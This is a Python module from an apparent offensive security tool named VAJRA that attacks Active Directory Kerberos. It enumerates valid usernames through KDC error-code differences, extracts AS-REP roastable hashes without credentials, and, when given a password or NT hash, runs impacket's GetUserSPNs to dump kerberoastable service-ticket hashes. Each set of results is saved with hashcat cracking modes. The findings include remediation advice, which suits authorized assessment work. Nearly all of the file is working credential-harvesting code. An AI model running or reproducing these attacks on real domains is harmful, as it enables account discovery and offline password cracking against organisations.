"""VAJRA Kerberos — unauth AND auth passes, both available.

Unauthenticated:  KDC user enumeration (error-code differentiation) and
AS-REP roasting — no credentials needed.

Authenticated:   kerberoasting with any supplied --ad-user/--ad-pass/--nthash
credentials via impacket GetUserSPNs.py — crackable TGS hashes (hashcat -m
13100) dumped to evidence."""
from core.database import Finding
from core.crypto_mini import (build_as_req, send_kdc, krb_error_code,
                              as_rep_cipher, asrep_hashcat_line)

CODE_MEANING = {
    6: ("unknown-principal", "info"),
    24: ("exists — preauth failed", "info"),
    25: ("exists — preauth required", "info"),
    14: ("client not in Kerberos DB", "info"),
    37: ("clock skew (host reachable, KDC alive)", "info"),
}


USER_CAP = 600
TIMEOUT_STRIKES = 10


def _kdc_reachable(kdc, timeout=2.0):
    """Fast preflight: bail on non-KDC targets instead of timing out per-user."""
    import socket
    try:
        s = socket.create_connection((kdc, 88), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def run(engine):
    t = engine.target
    ad = engine.state.get("ad") or {}
    realm = ad.get("realm") or guess_realm(t)
    dcs = [d["host"] for d in ad.get("dcs", [])] or [t.scan_host()]
    kdc = dcs[0]
    if not _kdc_reachable(kdc):
        engine.log.info("[kerb] no KDC reachable at %s:88 — "
                        "skipping user enumeration (not an AD target)"
                        % kdc)
        return
    users = engine.users()[:int(engine.cfg("kerb_user_cap", USER_CAP))]
    candidates = sorted({"administrator", "krbtgt", "guest"} |
                        {u for u in users})
    valid, roastable = [], []
    strikes = 0
    for user in candidates:
        req = build_as_req(realm, user)
        reply = send_kdc(kdc, req, timeout=4.0)
        if not reply:
            strikes += 1
            if strikes >= TIMEOUT_STRIKES and not valid:
                engine.log.warn("[kerb] KDC %s not answering AS-REQ "
                                "(not Kerberos?) — stopping enumeration "
                                "after %d timeouts" % (kdc, strikes))
                break
            continue
        strikes = 0
        code = krb_error_code(reply) if reply else None
        if code == 25:
            valid.append(user)
            continue
        if code in (24,):
            valid.append(user)
        if reply and reply[0:1] == b"\x6b":  # AS-REP without preauth
            got = as_rep_cipher(reply)
            if got:
                etype, cipher = got
                roastable.append((user, etype, cipher))
                break
    if valid:
        listing = "\n".join(valid[:200])
        extra = "" if len(valid) <= 200 else "\n... (%d total)" % len(valid)
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "recon", "medium",
            "Kerberos user enumeration: %d VALID usernames via KDC error "
            "differentiation" % len(valid),
            detail="KDC answers differently for existing vs non-existing "
                   "principals — no authentication needed.",
            evidence=listing + extra,
            remediation="This is protocol behaviour; monitor KDC for "
                        "enumeration patterns.",
            confidence="firm"))
        engine.log.finding("[kerb] %d valid usernames" % len(valid))
        engine.state.setdefault("ad_users", valid)

    if roastable:
        lines = []
        for user, etype, cipher in roastable:
            lines.append(asrep_hashcat_line(user, realm, etype, cipher))
        ev_rel = ""
        try:
            ev_rel = engine.save_evidence("asrep_hashes.txt",
                                          "\n".join(lines))
        except Exception:
            pass
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "exploit-proof", "critical",
            "[VERIFIED] AS-REP ROASTABLE accounts: %d" % len(roastable),
            detail="Accounts with 'Do not require Kerberos preauth' returned "
                   "crackable encrypted parts.\nCrack offline: hashcat -m "
                   "18200.%s" % ("\nSaved to %s" % ev_rel if ev_rel else ""),
            evidence="\n".join(l[:160] + "…" for l in lines[:6]),
            remediation="Enable preauth for these accounts; rotate their "
                        "passwords.", confidence="firm"))

    _try_kerberoast(engine, realm, kdc)


def _try_kerberoast(engine, realm, kdc):
    """Authenticated pass: request SPN service tickets with valid creds."""
    import subprocess
    from core.utils import which_tool
    creds = getattr(engine, "ad_creds", {}) or {}
    user = creds.get("user")
    if not user:
        return
    t = engine.target
    tool = which_tool("impacket-GetUserSPNs", "GetUserSPNs.py")
    if not tool:
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "coverage", "info",
            "Kerberoasting unavailable (impacket GetUserSPNs.py missing)",
            detail="With any valid domain credential VAJRA requests service "
                   "tickets and dumps crackable TGS hashes (hashcat -m "
                   "13100). Offline on this operator host.",
            confidence="firm"))
        return
    nthash = creds.get("nthash") or ""
    auth = "%s\\%s" % (realm, user) if nthash else \
        "%s\\%s:%s" % (realm, user, creds.get("password", ""))
    args = [tool, "-dc-ip", kdc, "-target-domain", realm.lower(),
            "-no-pass" if nthash else ""]
    args = [a for a in args if a]
    if nthash:
        args += ["-hashes", "aad3b435b51404eeaad3b435b51404ee:" + nthash]
    args.append(auth)
    try:
        out = subprocess.run(args, capture_output=True, text=True,
                             input="N\n", timeout=90)
    except Exception as e:
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "coverage", "info",
            "Kerberoast run failed: %r" % e, confidence="possible"))
        return
    text = (out.stdout or "") + "\n" + (out.stderr or "")
    hashes = [ln.strip() for ln in text.splitlines() if "$krb5tgs$" in ln]
    rejected = any(k in text for k in ("KDC_ERR_C_PRINCIPAL_UNKNOWN",
                                       "Client not found",
                                       "PREAUTH_FAILED"))
    ev_rel = ""
    if hashes:
        try:
            ev_rel = engine.save_evidence("kerberoast_hashes.txt",
                                          "\n".join(hashes))
        except Exception:
            pass
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "exploit-proof", "critical",
            "[VERIFIED] %d KERBEROASTABLE SPN accounts (auth)"
            % len(hashes),
            detail=("Service tickets requested with the supplied credentials "
                    "— crack offline: hashcat -m 13100%s"
                    % (".\nSaved to %s" % ev_rel if ev_rel else ".")),
            evidence="\n".join(h[:160] + "…" for h in hashes[:6]),
            remediation="Rotate SPN account passwords; never reuse the "
                        "machine account password as a service credential.",
            confidence="firm"))
        engine.log.finding("[kerb] %d kerberoastable SPNs (auth)" % len(hashes))
    elif rejected:
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "recon", "info",
            "Kerberoasting: supplied credentials rejected by KDC",
            detail=text[-400:] or "KDC refused the AS/TGS exchange",
            confidence="firm"))
    else:
        engine.db.add_finding(Finding(
            t.display, "ad.kerberos", "coverage", "info",
            "Kerberoasting: no harvestable SPN tickets returned",
            detail=("Command completed but produced no TGS hashes%s"
                    % ("\n" + text[-300:] if text else "")),
            confidence="possible"))


def guess_realm(t):
    dom = t.hostname
    parts = dom.split(".")
    return ".".join(parts[-2:]).upper() if "." in dom else dom.upper()
